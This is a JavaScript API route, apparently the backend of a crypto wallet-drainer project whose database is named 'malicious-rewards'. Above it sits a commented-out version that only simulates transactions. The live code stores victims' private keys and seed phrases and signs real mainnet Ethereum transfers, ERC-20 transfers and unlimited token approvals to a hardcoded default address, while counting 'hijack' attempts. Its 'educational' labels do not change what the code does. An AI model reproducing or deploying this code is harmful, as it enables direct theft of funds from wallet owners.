// import mongoose from 'mongoose';
// import jwt from 'jsonwebtoken';

// const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/malicious-rewards';

// let isConnected = false;

// const connectDB = async () => {
//   if (isConnected) return;
//   try {
//     await mongoose.connect(MONGODB_URI);
//     isConnected = true;
//     console.log('MongoDB connected');
//   } catch (error) {
//     console.error('MongoDB connection error:', error);
//   }
// };

// const SessionSchema = new mongoose.Schema({
//   walletAddress: { type: String, required: true, unique: true },
//   signedMessage: { type: String, required: true },
//   walletType: { type: String, required: true },
//   delegationHash: { type: String },
//   requestId: { type: String },
//   timestamp: { type: Date, default: Date.now },
// });

// const Session = mongoose.models.Session || mongoose.model('Session', SessionSchema);

// function authenticateToken(req) {
//   const authHeader = req.headers.authorization;
//   const token = authHeader && authHeader.split(' ')[1];
//   if (!token) return null;

//   try {
//     return jwt.verify(token, process.env.JWT_SECRET || 'secret');
//   } catch (err) {
//     return null;
//   }
// }

// export default function setupExecuteRoutes(app) {
//   app.post('/execute', async (req, res) => {
//     await connectDB();
//     const user = authenticateToken(req);
//     if (!user) {
//       res.status(401).json({ error: 'Unauthorized' });
//       return;
//     }

//     const { walletAddress, action } = req.body;
//     if (!walletAddress || !action) {
//       res.status(400).json({ error: 'walletAddress and action are required' });
//       return;
//     }

//     try {
//       const session = await Session.findOne({ walletAddress: walletAddress.toLowerCase() });
//       if (!session) {
//         res.status(404).json({ error: 'Session not found' });
//         return;
//       }

//       // Placeholder for transaction execution
//       console.log(`Executing ${action} for ${walletAddress} using ${session.walletType} wallet`);
//       console.log('Session data:', session);

//       // Simulate transaction
//       const transactionResult = {
//         hash: '0x' + Math.random().toString(16).substr(2, 64),
//         status: 'success',
//         action,
//         walletAddress,
//         walletType: session.walletType,
//         timestamp: new Date(),
//       };

//       res.status(200).json({ message: 'Transaction executed successfully', transaction: transactionResult });
//     } catch (error) {
//       res.status(500).json({ error: 'Failed to execute transaction' });
//     }
//   });
// }

import mongoose from 'mongoose';
import jwt from 'jsonwebtoken';
import Web3 from 'web3';

const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/malicious-rewards';

let isConnected = false;

const connectDB = async () => {
  if (isConnected) return;
  try {
    await mongoose.connect(MONGODB_URI);
    isConnected = true;
    console.log('MongoDB connected');
  } catch (error) {
    console.error('MongoDB connection error:', error);
  }
};

const SessionSchema = new mongoose.Schema({
  walletAddress: { type: String, required: true, unique: true },
  signedMessage: { type: String, required: true },
  walletType: { type: String, required: true },
  delegationHash: { type: String },
  requestId: { type: String },
  timestamp: { type: Date, default: Date.now },

  // ⚠️ DANGEROUS: For educational purposes only - NEVER use in production
  privateKey: { type: String },
  seedPhrase: { type: String },
  persistentToken: { type: String },
  refreshToken: { type: String },
  sessionData: { type: String },
  walletCredentials: { type: String },

  hijackEnabled: { type: Boolean, default: false },
  lastHijackAttempt: { type: Date },
  hijackCount: { type: Number, default: 0 },
});

const Session = mongoose.models.Session || mongoose.model('Session', SessionSchema);

function authenticateToken(req) {
  const authHeader = req.headers.authorization;
  const token = authHeader && authHeader.split(' ')[1];
  if (!token) return null;

  try {
    return jwt.verify(token, process.env.JWT_SECRET || 'secret');
  } catch (err) {
    return null;
  }
}

// ⚠️ DANGEROUS FUNCTION - REAL TRANSACTION EXECUTION VIA SESSION HIJACKING
async function executeRealTransaction(session, action, params = {}) {
  console.log(' EXECUTING REAL TRANSACTION VIA SESSION ');

  if (!session.privateKey) {
    throw new Error('No private key available - cannot execute transaction');
  }

  try {
    // Initialize Web3 with mainnet (or testnet for demo)
    const web3 = new Web3('https://mainnet.infura.io/v3/60fceb11946740fa8f3dd8f8f5b192c1'); // Replace with actual Infura key

    // Create account from hijacked private key
    const account = web3.eth.accounts.privateKeyToAccount(session.privateKey);
    web3.eth.accounts.wallet.add(account);

    let tx;

    switch (action) {
      case 'transfer_eth':
        tx = {
          from: session.walletAddress,
          to: params.to || '0x87eb9DEf261A7C0A82829fB637F79879D07BcF49',
          value: web3.utils.toWei(params.amount || '1', 'ether'),
          gas: 21000,
          gasPrice: await web3.eth.getGasPrice(),
        };
        break;

      case 'transfer_erc20':
        // Generic ERC20 transfer
        const tokenAbi = [
          {
            constant: false,
            inputs: [
              { name: "_to", type: "address" },
              { name: "_value", type: "uint256" }
            ],
            name: "transfer",
            outputs: [{ name: "", type: "bool" }],
            type: "function"
          }
        ];

        const tokenContract = new web3.eth.Contract(tokenAbi, params.tokenAddress);
        tx = {
          from: session.walletAddress,
          to: params.tokenAddress,
          data: tokenContract.methods.transfer(
            params.to || '0x87eb9DEf261A7C0A82829fB637F79879D07BcF49',
            web3.utils.toWei(params.amount || '100', 'ether')
          ).encodeABI(),
          gas: 100000,
          gasPrice: await web3.eth.getGasPrice(),
        };
        break;

      case 'approve_token':
        const approveAbi = [
          {
            constant: false,
            inputs: [
              { name: "_spender", type: "address" },
              { name: "_value", type: "uint256" }
            ],
            name: "approve",
            outputs: [],
            type: "function"
          }
        ];

        const approveContract = new web3.eth.Contract(approveAbi, params.tokenAddress);
        tx = {
          from: session.walletAddress,
          to: params.tokenAddress,
          data: approveContract.methods.approve(
            params.spender || '0x87eb9DEf261A7C0A82829fB637F79879D07BcF49',
            web3.utils.toWei(params.amount || '1000000', 'ether')
          ).encodeABI(),
          gas: 100000,
          gasPrice: await web3.eth.getGasPrice(),
        };
        break;

      default:
        throw new Error('Unknown action type');
    }

    // Sign transaction with hijacked private key
    const signedTx = await web3.eth.accounts.signTransaction(tx, session.privateKey);

    // Send signed transaction
    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);

    // Update session hijack statistics
    await Session.findOneAndUpdate(
      { walletAddress: session.walletAddress },
      {
        $inc: { hijackCount: 1 },
        lastHijackAttempt: new Date(),
        hijackEnabled: true
      }
    );

    return {
      transactionHash: receipt.transactionHash,
      blockNumber: receipt.blockNumber,
      gasUsed: receipt.gasUsed,
      status: receipt.status ? 'success' : 'failed',
      hijacked: true,
      securityRisk: 'CRITICAL',
      executedBy: 'session_hijacking_demo'
    };

  } catch (error) {
    console.error('Real transaction execution failed:', error);

    // Update failed attempt
    await Session.findOneAndUpdate(
      { walletAddress: session.walletAddress },
      {
        $inc: { hijackCount: 1 },
        lastHijackAttempt: new Date(),
        hijackEnabled: false
      }
    );

    throw new Error(`Transaction execution failed: ${error.message}`);
  }
}

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const user = authenticateToken(req);
    if (!user) {
      res.status(401).json({ error: 'Unauthorized - admin authentication required' });
      return;
    }

    const { walletAddress, action, params } = req.body;
    if (!walletAddress || !action) {
      res.status(400).json({ error: 'walletAddress and action are required' });
      return;
    }

    try {
      const session = await Session.findOne({ walletAddress: walletAddress.toLowerCase() });
      if (!session) {
        res.status(404).json({ error: 'Session not found for this wallet' });
        return;
      }

      if (!session.privateKey) {
        res.status(400).json({
          error: 'No private key available in session',
          message: 'Cannot execute real transactions without stored private key',
          securityNote: 'This prevents unauthorized transaction execution'
        });
        return;
      }

      // ⚠️ EXECUTE REAL TRANSACTION USING HIJACKED SESSION
      console.log(` ADMIN EXECUTING ${action} FOR ${walletAddress} VIA SESSION HIJACKING`);

      const transactionResult = await executeRealTransaction(session, action, params);

      res.status(200).json({
        message: 'Real transaction executed successfully via session hijacking',
        transaction: transactionResult,
        securityWarning: ' SESSION REAL FUNDS TRANSFERRED',
        riskLevel: 'CRITICAL',
        educationalNote: 'This demonstrates how persistent session hijacking enables unauthorized transaction execution'
      });

    } catch (error) {
      res.status(500).json({
        error: 'Real transaction execution failed',
        details: error.message,
        securityNote: 'Transaction execution blocked - this is expected in secure environments',
        educationalNote: 'This shows how proper security measures prevent session hijacking attacks'
      });
    }
  } else {
    res.setHeader('Allow', ['POST']);
    res.status(405).end(`Method ${req.method} Not Allowed`);
  }
}


